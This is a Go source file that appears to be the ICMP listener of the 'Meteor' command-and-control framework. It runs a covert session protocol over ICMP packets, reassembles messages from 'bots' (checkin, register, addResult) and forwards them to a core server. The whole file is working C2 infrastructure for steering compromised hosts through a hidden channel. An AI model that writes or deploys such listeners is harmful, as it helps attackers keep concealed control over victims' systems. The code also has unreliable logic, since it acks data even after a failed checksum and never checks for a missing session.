package main

import (
	"encoding/base64"
	lUtils "github.com/degenerat3/meteor/listeners/utils"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"golang.org/x/net/icmp"
	"log"
	"net"
	"os"
)

type session struct {
	sid        int32        // session ID
	peer       net.Addr     // net address of the session peer
	rData      []byte       // data recieved
	tData      [][]byte     // data to be transferred, split into manageable chunks
	cachedPyld []byte       // most recent payload
	cachedChk  []byte       // most recent checksum
	cachedFlg  mcs.CTP_Flag // most recent flag
}

var (
	// CORESERVER is the IP:Port of the Meteor core
	CORESERVER = os.Getenv("CORE_SERVER") // format: 9.9.9.9:9999

	// LOGPATH is the output path (including fname) for the listener logs
	LOGPATH = os.Getenv("LOGPATH")

	// write info logs to this
	infoLog *log.Logger

	// write warning logs to this
	warnLog *log.Logger

	// write all errors to this
	errLog *log.Logger

	// holds all the active sessions
	sessions []session

	//max size of filedata chunks
	splitSize = 1024
)

func main() {
	infoLog, warnLog, errLog = lUtils.InitLogger(LOGPATH)
	conn := getListener("0.0.0.0")
	for {
		respProto, peer := readFromListener(conn)
		go handleCTPPayload(respProto, peer, conn)
	}
}

func handleCTPPayload(respProto *mcs.CTP, peer net.Addr, conn *icmp.PacketConn) {
	switch respFlag := respProto.GetTypeFlag(); respFlag {
	case 0: // session init
		ses := genSession(respProto, peer)
		writeToListener(conn, peer, ses.sid, []byte("sidAck"), []byte(""), 1)
		updateSessionCache(ses.sid, []byte("sidAck"), []byte(""), 1)
		return
	case 1: // ack
		switch rcvdPyld := string(respProto.GetPayload()); rcvdPyld {
		case "finAck": // client sent/rec'd all data, done
			sid := respProto.GetSessionId()
			delSession(sid)
			return
		case "mAck":
			sid := respProto.GetSessionId()
			peer, nextChunk, chksm, flg := genNextData(sid)
			updateSessionCache(sid, nextChunk, chksm, flg)
			writeToListener(conn, peer, sid, nextChunk, chksm, flg)
			return
		}
	case 2: // data
		sid := respProto.GetSessionId()
		match := processMCSData(sid, respProto.GetPayload(), respProto.GetChecksum())
		if match == false { // if our checksum didn't pass, requeset a retransmission
			writeToListener(conn, peer, sid, []byte(""), []byte(""), 4)
			updateSessionCache(sid, []byte(""), []byte(""), 4)
		}
		writeToListener(conn, peer, sid, []byte("mAck"), []byte(""), 1) // if checksum passed, ack it
		updateSessionCache(sid, []byte("mAck"), []byte(""), 1)
		return
	case 3: // fin
		sid := respProto.GetSessionId()
		ses := getSession(sid)
		mcsPyld := ses.rData
		retData := handleMCSPayload(mcsPyld)
		splitPayload(retData, ses)
		peer, nextChunk, chksm, flg := genNextData(sid)
		updateSessionCache(sid, nextChunk, chksm, flg)
		writeToListener(conn, peer, sid, nextChunk, chksm, flg)
		return
	case 4: // retrans
		sid := respProto.GetSessionId()
		ses := getSession(sid)
		writeToListener(conn, ses.peer, sid, ses.cachedPyld, ses.cachedChk, ses.cachedFlg)
		return
	}
	return
}

// handlePayload will take the fully transferred byte slice and extract the appropriate data for sending to core
func handleMCSPayload(data []byte) []byte {
	comms := &mcs.MCS{}
	err := proto.Unmarshal(data, comms)
	if err != nil {
		errLog.Println("Error unmarshalling client data: " + err.Error())
		return []byte("")
	}
	md := comms.GetMode()
	var retData []byte
	if md == "checkin" {
		infoLog.Println("Handling checkin from bot: " + comms.GetUuid())
		retData = lUtils.HandleCheckin(comms.GetUuid(), CORESERVER)
	} else if md == "register" {
		infoLog.Println("Handling register from bot: " + comms.GetUuid())
		retData = lUtils.HandleReg(comms.GetUuid(), comms.GetInterval(), comms.GetDelta(), comms.GetHostname(), CORESERVER)
	} else if md == "addResult" {
		infoLog.Println("Handling addResult for action: " + comms.GetUuid())
		retData = lUtils.HandleAddRes(comms.GetUuid(), comms.GetResult(), CORESERVER)
	} else {
		warnLog.Println("Recieved an unknown mode")
		retData = []byte("")
	}
	encoded := base64.StdEncoding.EncodeToString(retData)
	return []byte(encoded)
}

func genSession(respProto *mcs.CTP, peer net.Addr) session {
	var ses session
	ses.sid = respProto.GetSessionId()
	ses.peer = peer
	sessions = append(sessions, ses)
	return ses
}

func delSession(sid int32) {
	for i, ses := range sessions {
		if sid == ses.sid {
			sessions[i] = sessions[len(sessions)-1] // replace session with last index
			sessions = sessions[:len(sessions)-1]   // trim last index
		}
	}
}

func getSession(sid int32) *session {
	for i, ses := range sessions {
		if sid == ses.sid {
			return &sessions[i]
		}
	}
	return nil
}

func updateSessionCache(sid int32, pyld []byte, chk []byte, flg mcs.CTP_Flag) {
	ses := getSession(sid)
	ses.cachedPyld = pyld
	ses.cachedChk = chk
	ses.cachedFlg = flg
	return
}

func splitPayload(pyld []byte, ses *session) {
	var chunks [][]byte
	for {
		if len(pyld) > splitSize {
			chnk := pyld[0:splitSize]
			chunks = append(chunks, chnk)
			pyld = pyld[splitSize:]
		} else {
			chunks = append(chunks, pyld)
			break
		}
	}
	ses.tData = chunks
	return
}

func getNextChunk(ses *session) []byte {
	if len(ses.tData) > 0 {
		next := ses.tData[0]
		if len(ses.tData) >= 1 {
			ses.tData = ses.tData[1:]
		}
		return next
	}
	return []byte("")

}

func genNextData(sid int32) (net.Addr, []byte, []byte, mcs.CTP_Flag) {
	ses := getSession(sid)
	pyld := getNextChunk(ses)
	if len(pyld) == 0 {
		return ses.peer, []byte(""), []byte(""), 3 // send a FIN if we're done
	}
	chk := calcChecksum(pyld)
	return ses.peer, pyld, chk, 2 // send next chunk as DATA
}

func processMCSData(sid int32, pyld []byte, chk []byte) bool {
	myChk := calcChecksum(pyld)
	if match := compareChks(myChk, chk); match == false {
		return false
	}
	ses := getSession(sid)
	ses.rData = append(ses.rData, pyld...)
	return true
}
